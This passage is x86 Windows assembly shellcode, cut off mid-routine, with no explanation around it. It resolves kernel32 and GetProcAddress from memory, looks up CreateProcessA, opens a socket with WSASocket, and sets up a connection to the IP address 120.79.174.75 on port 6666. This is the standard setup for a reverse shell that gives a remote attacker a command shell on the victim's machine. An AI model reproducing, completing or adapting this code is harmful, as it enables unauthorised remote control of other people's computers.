            lodsd    ;EAX=ThirdMod->kernel
            mov ebx,[eax+0x10] ;EBX=kernel->DllBase
            ;Get address of GetProcessAddress
            mov edx,[ebx+0x3c] ;DOS HEADER->PE HEADER offset
            add edx,ebx ;PE HEADER 
            mov edx,[edx+0x78] ;EDX=DATA DIRECTORY
            add edx,ebx ;EDX=DATA DIRECTORY
            ;compare string 
            xor ecx,ecx
            mov esi,[edx+0x20]
            add esi,ebx
    Get_Func:
            inc ecx
            lodsd ;mov eax,esi;esi+=4
            add eax,ebx;
            cmp dword ptr[eax],0x50746547 ;GetP
            jnz Get_Func
            cmp dword ptr[eax+0x4],0x41636f72;proA
            jnz Get_Func
            cmp dword ptr[eax+0x8],0x65726464 ;ddre
            jnz Get_Func
            ;get address
            mov esi,[edx+0x24] ;AddressOfNameOrdinals
            add esi,ebx
            mov cx,[esi+ecx*2];num
            dec ecx 
            mov esi,[edx+0x1c];AddressOfFunctions
            add esi,ebx
            mov edx,[esi+ecx*4] 
            add edx,ebx ;EDX = GetProcessAddress
    ;EDX=GetProcAddr
    ;EBX=kernel32
            ;get CreateProcess address
            xor ecx,ecx
            push ebx ;Kernel32
            push edx;GetProcAddr
            mov cx,0x4173;sA
            push ecx ;sA
            push 0x7365636F;oces
            push 0x72506574;tePr
            push 0x61657243;Crea
            push esp ;"CreateProcessA"
            push ebx
            call edx;GetProcAddr("CreateProcessA")
            add esp,0x10 ;clean stack
            push eax ;CreateProcessA
            ;CreateProcessA 0 sucess.else fail
            //WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,0,0)
            mov eax,[esp+0x2c];WSASocket
            xor ecx,ecx
            push ecx
            push ecx
            push ecx
            mov cx,0x6
            push ecx
            mov cx,0x1
            push ecx
            inc ecx
            push ecx
            call eax
            push eax; //push socket
            //inet_addr(120.79.174.75)
            mov eax,[esp+0x28] ;inet_addr
            xor ecx,ecx
            mov cx,0x35
            push ecx;5
            push 0x372E3437;74.7
            push 0x312E3937;79.1
            push 0x2E303231;120.
            push esp;
            call eax;
            add esp,0x10
            push eax;push Remote_addr -->sa_data+2
            //htons(6666)
            mov eax,[esp+0x28] ;htons
            push 0x1A0A ;6666
            call eax
            mov edx,[esp+0x30];connect
            //Store sock_addr
            push ax;push Remote_ports -->sa_data